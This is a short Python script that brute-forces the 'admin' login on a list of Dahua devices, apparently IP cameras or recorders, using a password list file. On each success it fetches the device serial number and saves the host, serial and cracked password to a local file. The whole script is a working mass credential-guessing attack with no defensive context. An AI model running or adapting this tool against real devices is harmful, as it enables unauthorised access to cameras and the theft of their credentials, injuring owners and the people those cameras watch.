from dahua_rpc import DahuaRpc, LoginError

def try_login(dahua, password):
    try:
        dahua.login()
        print(f"Login successful with password: {password}")
        return True
    except LoginError as e:
        print(f"Login failed with password: {password}")
        return False
    except Exception as e:
        print(f"Error occurred during login: {str(e)}")
        return False

def save_serial_number(dahua, password, host):
    response = dahua.request(method="magicBox.getSerialNo")
    if response is None:
        print("Request timed out. Skipping serial number retrieval.")
    elif response['result']:
        serial_number = response['params']['sn']
        with open('serial_numbers.txt', 'a') as file:
            file.write(f"Host: {host}, Serial Number: {serial_number}, Password: {password}\n")
        print(f"Serial number and password saved: {serial_number}, {password}")
    else:
        print("Failed to retrieve serial number.")

# Set the username, password list file, hosts file, and timeout value
username = "admin"
password_file = "password-list.txt"
hosts_file = "hosts.txt"
timeout = 3  # Timeout value in seconds

# Read passwords from the file
with open(password_file, 'r') as file:
    passwords = file.read().splitlines()

# Read hosts from the file
with open(hosts_file, 'r') as file:
    hosts = file.read().splitlines()

# Iterate over each host
for host in hosts:
    print(f"\nTrying host: {host}")
    
    # Iterate over each password and attempt login
    for password in passwords:
        dahua = DahuaRpc(host=host, username=username, password=password, timeout=timeout)
        if try_login(dahua, password):
            save_serial_number(dahua, password, host)
            break
